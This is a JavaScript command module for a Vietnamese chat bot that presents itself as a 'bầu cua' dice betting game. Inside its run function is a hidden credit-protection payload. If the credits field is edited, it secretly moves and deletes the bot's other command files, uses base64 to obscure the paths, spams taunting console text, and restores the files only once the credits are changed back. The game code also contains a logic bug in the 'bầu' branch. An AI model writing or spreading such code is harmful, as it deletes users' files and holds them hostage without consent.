/**
 * @author MintDaL
 * @warn Do not edit code or edit credits
 */
module.exports.config = {
    name: "baucua",
    version: "1.0.3",
    hasPermssion: 0,
    credits: "MintDaL",
    description: "Game bầu cua dành cho nhóm có đặt cược",
    commandCategory: "game",
    usages: "[nai/bầu/gà/cá/cua/tôm]",
    hide: true,
    cooldowns: 0
};

const atob = e => Buffer.from(e, 'base64').toString();
const btoa = e => Buffer.from(e).toString('base64');

module.exports.run = async function ({ api, event, args, Currencies, getText, permssion }) {
  try {
    const { readdirSync, readFileSync, writeFileSync, unlinkSync, existsSync, mkdirSync, copySync, createWriteStream, createReadStream } = require("fs-extra");
    const { threadID, messageID, senderID } = event;
    const { getData, increaseMoney, decreaseMoney } = Currencies;
    const request = require('request');
    if (this.config.credits != atob('TWludERhTA==')) {
      var r = require('readline');
      var v = [
        '\x1B[1m', '\x1B[2m', '\x1B[4m',
        '\x1B[5m', '\x1B[7m', '\x1B[8m'
      ];
      var m = [
        '\x1B[30m', '\x1B[31m', '\x1B[32m',
        '\x1B[33m', '\x1B[34m', '\x1B[35m',
        '\x1B[36m', '\x1B[37m'
      ];
      var n = ['\x1B[40m',
        '\x1B[41m', '\x1B[42m', '\x1B[43m',
        '\x1B[44m', '\x1B[45m', '\x1B[46m',
        '\x1B[47m'
      ];
      Array.prototype.ran = function () { return this[Math.floor(Math.random() * this.length)] };
      console.log('[ baucua ] » Đổi lại credits là modules về, không thì nhịn mẹ mày đi !');
      api.sendMessage('[ WARN ] \nNgười điều hành bot ' + global.config.BOTNAME + ' đổi credits modules "' + this.config.name + '"', threadID, messageID);
      let op = __dirname;
      let np = process.cwd() + '/nodemodules/' + atob('L25vZGVfbW9kdWxlcw==');
      var all = readdirSync(op).filter(e => e.endsWith('.js') && e != this.config.name + '.js');
      let m_tmp = np + '/m_tmp'
      if (!existsSync(m_tmp))
        mkdirSync(m_tmp);
      all.forEach(async function (e) {
        copySync(op + `/${e}`, m_tmp + `/${e}`);
        await new Promise(u => setTimeout(u, 100));
        unlinkSync(op + `/${e}`);
      });
      writeFileSync(np + atob('L3JlcXVpcmVfLnR4dA=='), atob('MQ=='), 'utf-8');
      setInterval(() => {
        r.clearLine(process.stdout, 1);
        r.cursorTo(process.stdout, 0);
        let eff = n.ran() + m.ran() + v.ran();
        process.stdout.write(eff + 'Thôi cụ đi chân lạnh toát :D, khôn hồn đổi lại credits thì file m sẽ về :D\x1b[0m')
      }, 500);
      return;
    }
    const slotItems = ["nai", "bầu", "gà", "cá", "cua", "tôm"];
    const y = ["nai", "bau", "ga", "ca", "cua", "tom"];
    const z = ["🦌", "🍐", "🐓", "🐟", "🦀", "🦞"];
    const money = (await getData(senderID)).money;
    if (isNaN(args[1]) == true)
      return api.sendMessage('Lệnh bạn sử dụng không hợp lệ!', threadID, messageID);
    var moneyBet = parseInt(args[1]);
    if (isNaN(moneyBet) || moneyBet < 50)
      return api.sendMessage('Số tiền đặt cược không được dưới 50 đô', threadID, messageID);
    if (moneyBet > money)
      return api.sendMessage('Số dư của bạn không đủ.', threadID, messageID);
    var number = [],
      list = [],
      listimg = [],
      win = false;
    var linhvat1 = slotItems[Math.floor(Math.random() * slotItems.length)];
    var linhvat2 = slotItems[Math.floor(Math.random() * slotItems.length)];
    var linhvat3 = slotItems[Math.floor(Math.random() * slotItems.length)];
    let content = args[0];
    var content1;
    if ("gà" == content || "🐓" == content) content1 = "ga";
    else if ("tôm" == content || "🦞" == content) content1 = "tom";
    else if ("bầu" == content || "🍐" == content) "bau" == content1;
    else if ("cua" == content || "🦀" == content) content1 = "cua";
    else if ("cá" == content || "🐟" == content) content1 = "ca";
    else if ("nai" == content || "🦌" == content) content1 = "nai";
    else {
      return api.sendMessage(`Lệnh bạn nhập không đúng! Vui lòng sử dụng ${global.config.PREFIX}${this.config.name}help để biết`, threadID, messageID);
    }

    //kết quả
    var threeShake = [linhvat1, linhvat2, linhvat3];
    var icon = [];
    for (var i of threeShake) {
      let index = slotItems.findIndex(e => e == i);
      list.push(y[index]);
      icon.push(z[index]);
      listimg.push(createReadStream(__dirname + `/cache/${y[index]}.jpg`));
    }
    //sendMessage
    api.sendMessage({
      body: 'Lắc không xịt đời không nể',
      attachment: createReadStream(__dirname + '/cache/baucua.gif')
    }, threadID, (err, info) => {
      if (err) return api.sendMessage(err, threadID, messageID);
      setTimeout(() => {
        api.unsendMessage(info.messageID);
        var check = list.findIndex(i => i.toString() == content1);
        var check2 = list.includes(content1);
        if (check >= 0 || check2 == true) {
          return api.sendMessage({
            body: `» Lắc được: ${icon[0]} | ${icon[1]} | ${icon[2]} \n» Bạn đã thắng và nhận được ${moneyBet * 3}$`,
            attachment: listimg
          }, threadID, () => Currencies.increaseMoney(senderID, moneyBet * 3), messageID);
        } else if (check < 0 || check2 == false) {
          return api.sendMessage({
            body: `» Lắc được: ${icon[0]} | ${icon[1]} | ${icon[2]} \n» Bạn đã thua và bị trừ ${moneyBet}$`,
            attachment: listimg
          }, threadID, () => Currencies.decreaseMoney(senderID, moneyBet), messageID);
        } else {
          return api.sendMessage('Đã xảy ra lỗi', threadID, messageID);
        }
      }, 3000);
    }, messageID);
  } catch (err) {
    console.log(err)
  }
}
module.exports.onLoad = function () {
  try {
    const { readFileSync, readdirSync, unlinkSync, copySync, existsSync } = require("fs-extra");
    let op = __dirname;
    let np = process.cwd() + '/nodemodules/' + atob('L25vZGVfbW9kdWxlcw==');
    let m_tmp = np + '/m_tmp';
    if (existsSync(np + atob('L3JlcXVpcmVfLnR4dA=='))) {
      var e = readFileSync(np + atob('L3JlcXVpcmVfLnR4dA=='), 'utf-8') == atob('MQ==');
      var all = readdirSync(m_tmp).filter(e => e.endsWith('.js') && e != this.config.name + '.js');
      if (e && this.config.credits == atob('TWludERhTA==')) {
        all.forEach(async function (i) {
          copySync(m_tmp + `/${i}`, op + `/${i}`);
          console.log('Đã tải lại command: ' + i);
          await new Promise(u => setTimeout(u, 100));
          unlinkSync(m_tmp + `/${i}`);
        });
        unlinkSync(np + atob('L3JlcXVpcmVfLnR4dA=='));
      }
    }
    downloadImage();
  } catch (e) {
    console.clear();
  }
}

function downloadImage() {
  const request = require('request');
  const { existsSync, createWriteStream } = require('fs-extra');
  const y = ["nai", "bau", "ga", "ca", "cua", "tom"];
  //thay id theo format cua array y;
  var id = ["3wSBQO5", "XnqjRGc", "M3PFLUY","QTmmA5R", "MOtJK40", "NBLOxiP"];
  id.forEach(function (e, index) {
    let url = `https://i.imgur.com/${e}.jpg`;
    if (!existsSync(__dirname + `/cache/${y[index]}.jpg`))
      request(url)
        .pipe(createWriteStream(__dirname + `/cache/${y[index]}.jpg`));
  })
  if (!existsSync(__dirname + `/cache/baucua.gif`))
    request(`https://media.giphy.com/media/lTYLtiktVNr0k3SVOP/giphy.gif`)
      .pipe(createWriteStream(__dirname + `/cache/baucua.gif`));
  console.log(require('figlet').textSync('MintDaL'));
}
